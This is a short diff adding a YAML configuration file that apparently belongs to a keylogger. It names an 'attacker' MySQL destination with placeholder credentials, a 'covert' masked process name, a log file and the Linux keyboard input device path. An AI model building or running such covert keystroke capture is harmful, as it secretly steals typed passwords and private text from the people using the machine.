@@ -1,0 +1,9 @@
+attacker:
+  host: localhost
+  port: 3306
+  username: myuser
+  password: mypassword
+covert:
+  process_name: masked
+  log: ./log.txt
+  device: /dev/input/by-path/platform-i8042-serio-0-event-kbd
